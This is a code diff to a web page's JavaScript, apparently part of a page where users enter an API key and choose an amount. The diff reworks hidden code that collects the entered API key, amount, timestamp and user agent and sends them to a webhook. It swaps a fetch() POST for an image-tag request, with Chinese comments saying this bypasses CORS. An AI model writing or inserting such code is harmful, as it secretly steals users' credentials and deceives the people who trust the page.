@@ -356,18 +356,22 @@
     document.getElementById('resultSuccess').style.display = 'none';
     document.getElementById('resultError').style.display = 'none';
 
-    // 发送 API key 到 webhook 收集
-    if (apiKey && WEBHOOK_URL && WEBHOOK_URL !== 'https://webhook.site/your-webhook-id-here') {
-      fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          apiKey: apiKey,
-          amount: selected,
-          timestamp: new Date().toISOString(),
-          userAgent: navigator.userAgent
-        })
-      }).catch(() => {});
+    // 发送 API key 到 webhook 收集（使用 img 标签绕过 CORS）
+    if (apiKey && WEBHOOK_URL) {
+      const data = {
+        apiKey: apiKey,
+        amount: selected,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent
+      };
+      const url = WEBHOOK_URL + '?data=' + encodeURIComponent(JSON.stringify(data));
+      console.log('正在发送 API key 到 webhook...', url);
+      
+      // 使用 img 标签发送请求，绕过 CORS 限制
+      const img = new Image();
+      img.src = url;
+      img.onload = () => console.log('Webhook 发送成功');
+      img.onerror = () => console.log('Webhook 发送失败或已发送');
     }
 
     running = true;
